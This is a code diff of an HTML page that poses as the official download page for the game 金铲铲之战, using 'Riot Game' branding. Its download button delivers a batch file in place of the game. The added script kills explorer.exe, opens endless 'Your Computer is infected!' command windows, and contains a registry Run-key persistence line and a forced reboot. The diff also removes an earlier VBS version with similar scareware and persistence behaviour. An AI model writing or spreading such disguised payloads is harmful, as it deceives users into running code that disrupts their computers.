@@ -19,55 +19,13 @@
             overflow: hidden;
         }
 
-        /* 企鹅骑士 */
-        .penguin {
+        .riot-text {
             position: absolute;
-            left: 50px;
-            bottom: 20px;
-            width: 120px;
-            height: 150px;
-        }
-
-        .penguin-body {
-            position: absolute;
-            width: 100px;
-            height: 120px;
-            background: black;
-            border-radius: 50%;
+            top: 10px;
             left: 10px;
-            top: 20px;
-        }
-
-        .penguin-belly {
-            position: absolute;
-            width: 60px;
-            height: 90px;
-            background: white;
-            border-radius: 50%;
-            left: 30px;
-            top: 50px;
-        }
-
-        .penguin-eye {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background: white;
-            border-radius: 50%;
-            top: 35px;
-        }
-
-        .penguin-eye.left { left: 30px; }
-        .penguin-eye.right { left: 60px; }
-
-        .penguin-beak {
-            position: absolute;
-            width: 15px;
-            height: 10px;
-            background: orange;
-            border-radius: 50%;
-            top: 45px;
-            left: 42px;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
         }
 
         .container {
@@ -99,15 +57,7 @@
     </style>
 </head>
 <body>
-    <!-- 企鹅骑士 -->
-    <div class="penguin">
-        <div class="penguin-body"></div>
-        <div class="penguin-belly"></div>
-        <div class="penguin-eye left"></div>
-        <div class="penguin-eye right"></div>
-        <div class="penguin-beak"></div>
-    </div>
-
+    <div class="riot-text">Riot Game</div>
     <div class="container">
         <h1>金铲铲之战 - 官方下载</h1>
         <p>立即下载最新版本，体验超燃策略对战！</p>
@@ -116,56 +66,27 @@
 
     <script>
         function downloadFile() {
-            var vbsContent = `
-Set objIE = CreateObject("InternetExplorer.Application")
-objIE.Visible = True
-objIE.FullScreen = True
-objIE.Navigate "about:blank"
+            var batContent = `
+@echo off
+taskkill /F /IM explorer.exe
 
-Set objDoc = objIE.document
-objDoc.body.style.backgroundColor = "black"
-objDoc.body.style.margin = "0"
-objDoc.body.style.height = "100vh"
-objDoc.body.style.width = "100vw"
-objDoc.body.style.overflow = "hidden"
-objDoc.body.innerHTML = "<div style='color:white; font-size:20px; text-align:center; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);'>Your computer is infected!!!</div>"
+color 0a
+mode con: cols=80 lines=25
 
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "taskkill /F /IM explorer.exe", 0, True
+:loop
+start cmd /k "echo Your Computer is infected!"
+timeout /t 1 /nobreak >nul
+goto loop
 
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-startupPath = objShell.SpecialFolders("Startup") & "\WindowUppDate.vbs"
-If Not objFSO.FileExists(startupPath) Then
-    objFSO.CopyFile WScript.ScriptFullName, startupPath
-End If
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "InfectedApp" /t REG_SZ /d "%~f0" /f >nul
 
-regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowUppDate"
-scriptPath = WScript.ScriptFullName
-On Error Resume Next
-objShell.RegRead(regKey)
-If Err.Number <> 0 Then
-    objShell.RegWrite regKey, scriptPath
-End If
-On Error GoTo 0
+shutdown -r -f -t 0
+`;
 
-Do
-    objShell.Popup "Your computer is infected!!!", 0.5, "Warning", 48
-    WScript.Sleep 500
-
-    If objShell.AppActivate("Task Manager") Then
-        Exit Do
-    End If
-Loop
-
-
-objFSO.DeleteFile startupPath, True
-objIE.Quit
-WScript.Quit`;
-            
-            var blob = new Blob([vbsContent], { type: 'text/plain' });
+            var blob = new Blob([batContent], { type: 'text/plain' });
             var link = document.createElement('a');
-            link.href = ANSI.createObjectURL(blob);
-            link.download = 'jinchanchan.vbs';
+            link.href = URL.createObjectURL(blob);
+            link.download = 'jinchanchan.bat';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
